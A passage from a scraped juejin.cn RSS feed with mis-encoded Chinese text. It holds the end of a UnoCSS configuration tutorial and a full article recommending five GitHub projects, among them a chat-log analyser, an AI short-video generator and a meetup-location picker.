<pre><code class="hljs language-js" lang="js"># <span class="hljs-number">1.</span> å®‰è£…ä¾èµ–
npm install -D unocss @unocss/preset-uno @unocss/preset-attributify @unocss/preset-icons

# <span class="hljs-number">2.</span> åˆ›å»º uno.<span class="hljs-property">config</span>.<span class="hljs-property">ts</span>ï¼ˆæ‰‹åŠ¨åˆ›å»ºï¼‰

# <span class="hljs-number">3.</span> ä¿®æ”¹ vite.<span class="hljs-property">config</span>.<span class="hljs-property">ts</span>ï¼ˆæ·»åŠ  <span class="hljs-title class_">UnoCSS</span> æ’ä»¶ï¼‰

# <span class="hljs-number">4.</span> åœ¨ main.<span class="hljs-property">ts</span> ä¸­å¼•å…¥ <span class="hljs-string">'virtual:uno.css'</span>
</code></pre>
<h6 data-id="heading-10">Vue 3 + ViteÂ + TypeScriptÂ + Element Plusï¼Œå»ºè®®é…ç½®ï¼š</h6>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// uno.config.ts</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'unocss'</span>
<span class="hljs-keyword">import</span> presetUno <span class="hljs-keyword">from</span> <span class="hljs-string">'@unocss/preset-uno'</span>
<span class="hljs-keyword">import</span> presetIcons <span class="hljs-keyword">from</span> <span class="hljs-string">'@unocss/preset-icons'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">presets</span>: [
    <span class="hljs-title function_">presetUno</span>(),
    <span class="hljs-title function_">presetIcons</span>()
  ],
  <span class="hljs-comment">// å®‰å…¨åˆ—è¡¨ï¼ˆç¡®ä¿æŸäº›ç±»åä¸ä¼šè¢«æ¸…é™¤ï¼‰</span>
  <span class="hljs-attr">safelist</span>: [],
  <span class="hljs-comment">// å¿«æ·æ–¹å¼</span>
  <span class="hljs-attr">shortcuts</span>: {
    <span class="hljs-string">'btn'</span>: <span class="hljs-string">'px-4 py-2 rounded bg-blue-500 text-white hover:bg-blue-600'</span>
  }
})
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æ¨è 5 ä¸ªå°ä¼—ä½†æœ‰è¶£çš„ GitHub å¼€æºé¡¹ç›®ã€‚]]></title>    <link>https://juejin.cn/post/7592500570167853091</link>    <guid>https://juejin.cn/post/7592500570167853091</guid>    <pubDate>2026-01-08T05:44:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592500570167853091" data-draft-id="7592431064977670159" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æ¨è 5 ä¸ªå°ä¼—ä½†æœ‰è¶£çš„ GitHub å¼€æºé¡¹ç›®ã€‚"/> <meta itemprop="keywords" content="GitHub"/> <meta itemprop="datePublished" content="2026-01-08T05:44:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é€›é€›GitHub"/> <meta itemprop="url" content="https://juejin.cn/user/1442202996186093"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æ¨è 5 ä¸ªå°ä¼—ä½†æœ‰è¶£çš„ GitHub å¼€æºé¡¹ç›®ã€‚
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1442202996186093/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é€›é€›GitHub
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T05:44:53.000Z" title="Thu Jan 08 2026 05:44:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">01ã€å°†è§†é¢‘ç¬é—´è½¬åŒ–ä¸ºæ‰‹ç»˜æ•…äº‹</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ba4ccc30bbe740e681c8b9255409f1f1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768455893&amp;x-signature=nxgBshMcKoIuQIO%2BP%2BMr32yq5gE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™ä¸ªå¼€æºé¡¹ç›®æŒºæœ‰æ„æ€ï¼Œä½ æŠŠ B ç«™æˆ–è€…å°çº¢ä¹¦çš„è§†é¢‘é“¾æ¥ä¸¢è¿›å»ï¼Œå®ƒå°±èƒ½å˜èº«æˆä¸€ä¸ªå¸¦æ‰“ç‚¹åŠŸèƒ½çš„æ’­æ”¾å™¨ã€‚</p>
<p>çœ‹åˆ°å“ªä¸ªç”»é¢æœ‰æ„Ÿè§‰ï¼ŒæŒ‰ä¸ªå¿«æ·é”®å°±èƒ½æŠŠé‚£ä¸€å¸§æˆªä¸‹æ¥ï¼Œä¸ç”¨ä½ è‡ªå·±å†å»æˆªå›¾å·¥å…·é‡ŒæŠ˜è…¾ã€‚</p>
<p>ä½†è¿™ç©æ„å„¿æœ€æ ¸å¿ƒçš„å…¶å®æ˜¯ AI è„‘è¡¥èƒ½åŠ›ã€‚å®ƒæ¥äº† Google Gemini çš„å¤§æ¨¡å‹ï¼Œèƒ½æŠŠä½ æˆªä¸‹æ¥çš„é‚£äº›è§†é¢‘ç”»é¢ç¬é—´å˜æˆæ‰‹ç»˜é£æ ¼çš„åˆ†é•œè‰å›¾ï¼Œç”šè‡³è¿˜èƒ½æ ¹æ®ç”»é¢å†…å®¹è‡ªåŠ¨å¸®ä½ å†™å¥½å‘å°çº¢ä¹¦çš„æ–‡æ¡ˆã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4912a5b8dccc42f5b8ac77be10ad8357~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768455893&amp;x-signature=HUeaPhbZJMsCUj8JSgC4vRChhjE%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æŠ€æœ¯ä¸Šå®ƒæ˜¯ä¸ªçº¯å‰ç«¯é¡¹ç›®ï¼Œç”¨äº† React å’Œ Tailwind CSSï¼Œæ•°æ®ä¹Ÿæ˜¯å­˜åœ¨æµè§ˆå™¨æœ¬åœ°çš„ï¼Œä¸ç”¨æ‹…å¿ƒéšç§æ³„éœ²ã€‚</p>
<p>ä½œè€…æŠŠäº¤äº’åšå¾—æŒºç»†ï¼Œé’ˆå¯¹ç«–å±è§†é¢‘å’Œå®½å±è§†é¢‘éƒ½æœ‰é€‚é…ï¼Œç”šè‡³è¿˜è€ƒè™‘äº†æ‰¹é‡ç”Ÿæˆæ¥çœ API çš„é’±ï¼Œçœ‹å¾—å‡ºæ˜¯æ‡‚å†…å®¹åˆ›ä½œè€…ç—›ç‚¹çš„ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/318cd5898e014bfe802088285814b5e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768455893&amp;x-signature=NkozeGALrQ6tEg%2BE2pzqaukcbls%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<pre><code class="hljs language-bash" lang="bash">å¼€æºåœ°å€ï¼šhttps://github.com/RanFeng/clipsketch-ai
</code></pre>
<h2 data-id="heading-1">02ã€èŠå¤©è®°å½•åˆ†æå·¥å…·ï¼šChatLab</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f3b973c186524868ab994892ab42fab1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768455893&amp;x-signature=DI%2BJ3eeq9HG%2FUyxm1G8ZUAto%2BuA%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æˆ‘ä»¬ç°åœ¨çš„èŠå¤©è®°å½•éƒ½åœ¨å¾®ä¿¡ã€QQ è¿™äº› App é‡Œï¼ŒæŸ¥èµ·æ¥ä¸æ–¹ä¾¿è¿˜å®¹æ˜“ä¸¢ã€‚</p>
<p>ChatLab èƒ½æŠŠè¿™äº›èŠå¤©è®°å½•å¯¼å‡ºæ¥ï¼Œå­˜åˆ°ä½ ç”µè„‘æœ¬åœ°çš„æ•°æ®åº“é‡Œã€‚æ—¢ç„¶åˆ°äº†æ•°æ®åº“é‡Œï¼Œé‚£æ€ä¹ˆç©å°±éšä½ äº†ï¼Œä½ å¯ä»¥ç”¨ SQL æŸ¥å‡ºä½ å’Œå¯¹è±¡è°å‘çš„æ¶ˆæ¯æ›´å¤šï¼Œæˆ–è€…è°æœ€å–œæ¬¢åœ¨è¿™ä¸ªç¾¤é‡Œå‘è¡¨æƒ…åŒ…ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8411f50144b349f0896dd86e2a659bfa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768455893&amp;x-signature=zcqpUF0ALBG75UYuk9tVoJgHjjw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>æ¯”è¾ƒç¡¬æ ¸çš„æ˜¯å®ƒæ¥å…¥äº† AI Agentã€‚</p>
<p>ä½ ä¸éœ€è¦è‡ªå·±å†™å¤æ‚çš„æŸ¥è¯¢è¯­å¥ï¼Œç›´æ¥é—® AIï¼šå¸®æˆ‘åˆ†æä¸€ä¸‹ä¸Šä¸ªæœˆæˆ‘å’ŒæŸæŸèŠå¾—æœ€å¼€å¿ƒçš„è¯é¢˜æ˜¯ä»€ä¹ˆï¼Œå®ƒå°±èƒ½å»ç¿»ä½ çš„è®°å½•å¹¶æ€»ç»“å‡ºæ¥ã€‚</p>
<p>å› ä¸ºå®ƒå®Œå…¨è¿è¡Œåœ¨æœ¬åœ°ï¼Œä¸ç”¨æ‹…å¿ƒä½ çš„ç§å¯†èŠå¤©è¢«ä¸Šä¼ åˆ°äº‘ç«¯ï¼Œè¿™ä¸€ç‚¹å¯¹éšç§æ•æ„Ÿçš„äººæ¥è¯´éå¸¸å…³é”®ã€‚</p>
<p>ç›®å‰å®ƒæ”¯æŒå¾®ä¿¡ã€QQ å’Œ WhatsAppï¼Œç•Œé¢åšå¾—æŒºç°ä»£åŒ–ï¼Œç”¨çš„æ˜¯ Electron å’Œ Vueã€‚</p>
<p>å®ƒä¸ä»…ä»…æ˜¯ä¸ªå¤‡ä»½å·¥å…·ï¼Œæ›´åƒæ˜¯ä¸€ä¸ªèƒ½è®©ä½ â€œå¤ç›˜â€ç¤¾äº¤ç”Ÿæ´»çš„ä»ªè¡¨ç›˜ã€‚å¯¹äºæƒ³ä»å‡ ä¸‡æ¡é—²èŠä¸­æŒ–æ˜å‡ºä¸€ç‚¹äººç”Ÿè§„å¾‹çš„äººæ¥è¯´ï¼Œè¿™æ˜¯ä¸ªæŒºå¥½ç©çš„ç©å…·ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4b5ea57b1732437aa1d07fba5288eb7c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768455893&amp;x-signature=NBl49K5R6VX%2B1NyNplMP22gWCIs%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/hellodigua/ChatLab</span>
</code></pre>
<h2 data-id="heading-2">03ã€AI å…¨è‡ªåŠ¨çŸ­è§†é¢‘å¼•æ“</h2>
<p>AIDC å‡ºå“çš„è¿™ä¸ª Pixelle-Video åŸºæœ¬ä¸Šå°±æ˜¯å¥”ç€ä¸€é”®æˆç‰‡å»çš„ã€‚</p>
<p>ä½ åªéœ€è¦ç»™å®ƒä¸€ä¸ªä¸»é¢˜ï¼Œæ¯”å¦‚ ä¸ºä»€ä¹ˆæˆ‘ä»¬è¿˜æ²¡å‘ç°å¤–æ˜Ÿäººï¼Œå®ƒå°±å¼€å§‹å¹²æ´»äº†ï¼šè‡ªå·±å†™æ–‡æ¡ˆã€è‡ªå·±ç”»åˆ†é•œã€è‡ªå·±é…éŸ³ï¼Œæœ€åæŠŠè¿™äº›ç´ æåˆæˆä¸€ä¸ªå®Œæ•´çš„çŸ­è§†é¢‘ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/062a674e6c44451fada619a8aa48f688~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768455893&amp;x-signature=AEQzSal%2FpoahII%2BYh9YTi7eP8KY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®ƒè·Ÿå¸‚é¢ä¸Šå…¶ä»–ç±»ä¼¼å·¥å…·æœ€å¤§çš„ä¸åŒæ˜¯æ¨¡å—åŒ–ã€‚</p>
<p>å®ƒçš„åº•å±‚å…¶å®æ˜¯åŸºäº ComfyUI çš„ï¼Œè¿™æ„å‘³ç€å¦‚æœä½ è§‰å¾—é»˜è®¤çš„ç”»é£ä¸å¥½çœ‹ï¼Œæˆ–è€…é…éŸ³å¤ªç”Ÿç¡¬ï¼Œä½ å¯ä»¥ç›´æ¥æ›¿æ¢æ‰åº•å±‚çš„ ComfyUI å·¥ä½œæµã€‚</p>
<p>å¯¹äºæ™®é€šå°ç™½ï¼Œå®ƒæœ‰ç°æˆçš„ Web ç•Œé¢ç‚¹ç‚¹é¼ æ ‡å°±è¡Œï¼š</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1cce17e70e0f47b8b2a91d55f25b4263~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768455893&amp;x-signature=Y6WNES55Fl4ZOnOYGsDfDqcPy%2Bw%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>è¿™ä¸œè¥¿ç‰¹åˆ«é€‚åˆç”¨æ¥åšé‚£ç§ç§‘æ™®ç±»æˆ–è€…è¥é”€ç±»çš„çŸ­è§†é¢‘ã€‚</p>
<p>è™½ç„¶ AI ç”Ÿæˆçš„ç”»é¢æœ‰æ—¶å€™è¿ç»­æ€§ä¸å¦‚å®æ‹ï¼Œä½†ç”¨æ¥åšPPT å¼çš„è§£è¯´è§†é¢‘æ•ˆç‡æé«˜ã€‚</p>
<p>å®ƒç”šè‡³æ”¯æŒå¹¶è¡Œå¤„ç†ï¼Œèƒ½ä¸€æ¬¡æ€§æ‰¹é‡ç”Ÿæˆå¥½å‡ ä¸ªè§†é¢‘ï¼Œå®Œå…¨å°±æ˜¯ä¸ºäº†é‡äº§çŸ­è§†é¢‘è€Œè®¾è®¡çš„å·¥å‚ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/AIDC-AI/Pixelle-Video</span>
</code></pre>
<h2 data-id="heading-3">04ã€å“ªé‡Œçº¦ä¼šï¼ŸMeetSpot</h2>
<p>ä¸€å¸®æœ‹å‹ä½å¾—å¤©å—åœ°åŒ—ï¼Œèšä¼šåˆ°åº•çº¦åœ¨å“ªæœ€å…¬å¹³ï¼Ÿæ™®é€šçš„åœ°å›¾åªèƒ½æœé™„è¿‘ï¼ŒMeetSpot å¼€æºé¡¹ç›®å¯ä»¥ç®—æ‰€æœ‰äººçš„ä¸­å¿ƒç‚¹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c2df517b3f8048f7acd8e7a434e8c4f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768455893&amp;x-signature=aTNhEfC47bqYAijbhgfg8v3LIY0%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>ä½ è¾“å…¥å¤§å®¶çš„å‡ºå‘ä½ç½®ï¼Œå®ƒä¼šæ ¹æ®åœ°ç†ç®—æ³•ç®—å‡ºä¸€ä¸ªåŠ æƒä¸­å¿ƒï¼Œç„¶ååœ¨è¿™ä¸ªä¸­å¿ƒé™„è¿‘ç»™ä½ æ¨èé¤å…æˆ–å’–å•¡é¦†ã€‚</p>
<p>æ›´èªæ˜çš„æ˜¯å®ƒä¸ä»…ä»…æ˜¯ç®—è·ç¦»ï¼Œå®ƒæ˜¯ä¸ª AI Agentã€‚</p>
<p>æ¯”å¦‚ä½ æè¦æ±‚è¯´è¦ä¸ªå®‰é™èƒ½åœè½¦çš„åœ°æ–¹ï¼Œå®ƒä¼šåœ¨ç®—å‡ºçš„ä¸­å¿ƒç‚¹é™„è¿‘ï¼Œåˆ©ç”¨ AI å»ç­›é€‰ç¬¦åˆè¿™äº›è½¯æ€§æ¡ä»¶çš„åœ°ç‚¹ï¼Œå¹¶ç»™å‡ºæ¨èç†ç”±ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/587379d2d4c74afeb96334fdcfa4e8d5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768455893&amp;x-signature=1HFqRFXQAGjU9rmONeSnt5LMyfQ%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90daace7057f4bcabe2b7c3e271a21b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768455893&amp;x-signature=bpkQHop%2Bh6JaaDF4vaUybSkutKQ%3D" alt="å›¾ç‰‡" loading="lazy"/><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4719d83b7e7a476cb44bdf1285262036~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768455893&amp;x-signature=iW1XnJI0zBZkmGyoLNHZ8yssU3g%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>å®ƒç”šè‡³æœ‰ä¸€ä¸ªæ€ç»´é“¾å±•ç¤ºï¼Œå‘Šè¯‰ä½ ä¸ºä»€ä¹ˆé€‰è¿™å®¶åº—â€”â€”æ˜¯å› ä¸ºå®ƒè·ç¦»å¤§å®¶éƒ½ä¸è¿œï¼Œè¿˜æ˜¯å› ä¸ºå®ƒçš„è¯„åˆ†å’Œåœè½¦ä½æ›´ç¬¦åˆè¦æ±‚ã€‚</p>
<p>æŠ€æœ¯ä¸Šå®ƒç”¨äº†é«˜å¾·åœ°å›¾çš„ API åŠ ä¸Š FastAPIï¼Œè™½ç„¶æ˜¯ä¸ªå°å·¥å…·ï¼Œä½†åˆ‡å…¥ç‚¹éå¸¸å‡†ã€‚</p>
<p>ä»¥åä¸ç”¨åœ¨ç¾¤é‡Œäº‰è®ºä¸ä¼‘äº†ï¼ŒæŠŠæ‰€æœ‰äººçš„ä½ç½®è¾“è¿›å»ï¼Œè®© AI é€‰ä¸ªå¤§å®¶éƒ½å¿…é¡»æ¥å—çš„æ•°å­¦ä¸Šçš„æœ€ä¼˜è§£ï¼Œæ—¢çœäº‹åˆä¸ä¼¤å’Œæ°”ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/JasonRobertDestiny/MeetSpot</span>
</code></pre>
<h2 data-id="heading-4">05ã€å…¨è‡ªåŠ¨ AI è‡ªåª’ä½“æµæ°´çº¿</h2>
<p>æƒ³æè‡ªåª’ä½“çŸ©é˜µã€æ‰¹é‡åŒ–è¿è¥è´¦å·çš„äººçš„çœ‹è¿‡æ¥ï¼Œè¿™ä¸ªå« AI Media çš„å¼€æºé¡¹ç›®å¯ä»¥å…¨éƒ¨è‡ªåŠ¨åŒ–ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48ddaf5d4324472faff1bee307b09d9f~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6YCb6YCbR2l0SHVi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768455893&amp;x-signature=5dETYDfyQ4pu4Do%2F7bV3KvmVdvY%3D" alt="å›¾ç‰‡" loading="lazy"/></p>
<p>AIMedia å¯ä»¥çˆ¬å¾®åšã€æŠ–éŸ³ã€ç½‘æ˜“æ–°é—»çš„çƒ­ç‚¹ï¼Œç„¶åç”¨ AI æ ¹æ®è¿™äº›çƒ­ç‚¹è‡ªåŠ¨å†™æ–‡ç« ã€‚å†™å®Œè¿˜ä¸ç®—å®Œï¼Œå®ƒè¿˜èƒ½è‡ªåŠ¨ç»™ä½ é…å›¾ï¼Œç”šè‡³è‡ªåŠ¨å‘åˆ°ä»Šæ—¥å¤´æ¡ã€å…¬ä¼—å·å’Œå°çº¢ä¹¦ä¸Šã€‚</p>
<p>æŠŠæœç´ æã€æ”¹å†™ã€æ‰¾å›¾ã€æ’ç‰ˆã€åˆ†å‘ä¸€å¥—æµç¨‹æ•´åˆåˆ°ä¸€ä¸ªè½¯ä»¶é‡Œäº†ã€‚ä½œè€…è¿˜ç‰¹æ„æäº†ä¸ª Windows çš„ä¸€é”®æ•´åˆåŒ…ï¼Œä¸éœ€è¦ä½ æ‡‚ Python ç¯å¢ƒé…ç½®ï¼Œè§£å‹å°±èƒ½è·‘ã€‚</p>
<pre><code class="hljs language-arduino" lang="arduino">å¼€æºåœ°å€ï¼šhttps:<span class="hljs-comment">//github.com/Anning01/AIMedia</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Handleræœºåˆ¶]]></title>    <link>https://juejin.cn/post/7592582130594791475</link>    <guid>https://juejin.cn/post/7592582130594791475</guid>    <pubDate>2026-01-08T03:54:56.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592582130594791475" data-draft-id="7592147128215896116" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Handleræœºåˆ¶"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-01-08T03:54:56.000Z"/> <meta itemprop="image" 